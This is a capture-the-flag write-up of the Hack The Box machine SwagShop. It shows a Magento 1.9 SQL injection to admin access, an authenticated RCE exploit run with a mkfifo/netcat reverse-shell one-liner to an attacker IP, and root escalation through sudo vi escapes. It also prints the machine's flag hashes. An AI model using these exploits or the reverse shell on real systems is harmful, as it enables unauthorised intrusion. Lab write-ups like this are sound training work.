Machine: https://app.hackthebox.com/machines/188

IP: 10.10.10.140

Add swagshop.htb to /etc/hosts
# Enumeration

Port 80:

/media
/includes
/lib
/app
/js
  `SYNTAX: index.php/x.js?f=dir1/file1.js,dir2/file2.js`
/shell
/skin
/var
  /var/package/
    We see redis file, so this might use redis
/errors

http://swagshop.htb/mage
```
#!/bin/sh

# REPLACE with your PHP5 binary path (example: /usr/local/php5/bin/php )
#MAGE_PHP_BIN="php"

MAGE_PHP_SCRIPT="mage.php"
DOWNLOADER_PATH='downloader'

# initial setup
if test "x$1" = "xmage-setup"; then
    echo 'Running initial setup...'

    if test "x$2" != "x"; then
        MAGE_ROOT_DIR="$2"
    else
        MAGE_ROOT_DIR="`pwd`"
    fi

    $0 config-set magento_root "$MAGE_ROOT_DIR"
    $0 config-set preferred_state beta
    $0 channel-add http://connect20.magentocommerce.com/community
    exit
fi

# check that mage pear was initialized

if test "x$1" != "xconfig-set" &&
  test "x$1" != "xconfig-get" &&
  test "x$1" != "xconfig-show" &&
  test "x$1" != "xchannel-add" &&
  test "x`$0 config-get magento_root`" = "x"; then
    echo 'Please initialize Magento Connect installer by running:'
    echo "$0 mage-setup"
    exit;
fi

# find which PHP binary to use
if test "x$MAGE_PHP_BIN" != "x"; then
  PHP="$MAGE_PHP_BIN"
else
  PHP=php
fi


# get default pear dir of not set
if test "x$MAGE_ROOT_DIR" = "x"; then
    MAGE_ROOT_DIR="`pwd`/$DOWNLOADER_PATH"
fi

exec $PHP -C -q $INCARG -d output_buffering=1 -d variables_order=EGPCS \
    -d open_basedir="" -d safe_mode=0 -d register_argc_argv="On" \
    -d auto_prepend_file="" -d auto_append_file="" \
    $MAGE_ROOT_DIR/$MAGE_PHP_SCRIPT "$@"
```

http://swagshop.htb/index.php/admin

![image](https://github.com/Leng-Phirun/OSCP_Prep_TJNull/assets/100512862/3ab466a8-501b-43d8-bba3-e2f2fcfa7fde)

# Exploitation

https://raw.githubusercontent.com/joren485/Magento-Shoplift-SQLI/master/poc.py

Working SQLi exploit

Check http://10.10.10.140/admin with creds ypwq:123 

After logged in, we can see version of Magento at the bottom

http://swagshop.htb/index.php/admin/dashboard/index/key/e771a1a9f7b4dca0b24bd5a631fc9170/

`Magento ver. 1.9.0.0`

Using searchsploit, this is the most interesting one

![image](https://github.com/Leng-Phirun/OSCP_Prep_TJNull/assets/100512862/22716aea-ee06-4f37-9390-c7c2068bbf74)

But for the script to work, we need to modify 3 of these variables

```
username = ''
password = ''
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Sat, 15 Nov 2014 20:27:57 +0000'  # This needs to be the exact date from /app/etc/local.xml
```
TO

```
username = 'ypwq'
password = '123'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
```

To get the `install_date`:

```
curl -s http://10.10.10.140/app/etc/local.xml | grep date
<date><![CDATA[Wed, 08 May 2019 07:23:09 +0000]]></date>
```

Running the exploit

![image](https://github.com/Leng-Phirun/OSCP_Prep_TJNull/assets/100512862/07e8170f-ecae-4807-bf4c-4346f0a12ceb)


`mechanize` is a scriptable browser, and it’s complaining that there’s not login form with a password field. That’s because it’s trying to log into the base of the site. I’ll run it again, this time with the admin login page:

So we just need to provide login path of admin panel

We have RCE.

![image](https://github.com/Leng-Phirun/OSCP_Prep_TJNull/assets/100512862/464422e8-eef5-4246-8d98-c6bf017783c1)

Exploit:

`python2 37811.py 'http://swagshop.htb/index.php/admin' "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.12 1234 >/tmp/f"

Got the shell

![image](https://github.com/Leng-Phirun/OSCP_Prep_TJNull/assets/100512862/814207aa-5a44-4b79-bac1-24b19c7247a1)

# Post-Exploitation

## Shell as www-data

![image](https://github.com/Leng-Phirun/OSCP_Prep_TJNull/assets/100512862/fc6f5206-f059-4edc-b31e-549c9074d1d6)

We can read root flag using `vi`

`sudo /usr/bin/vi /var/www/html/../../../root/root.txt`

![image](https://github.com/Leng-Phirun/OSCP_Prep_TJNull/assets/100512862/13ea87b3-533f-4960-a8de-df690d3f3c8e)

We can also use GTFO to get shell

`sudo /usr/bin/vi /var/www/html/../../../root/root.txt`

Then
```
:set shell=/bin/bash
:shell
```

Another trick from GTFOBins also works

`sudo vi /var/www/html/a -c ':!/bin/sh'`

user.txt  918c2be1a0ab5e55f4587526278dc7cf
root.txt  9ed050abeb8b5f106896956296156d21

# Beyond Root


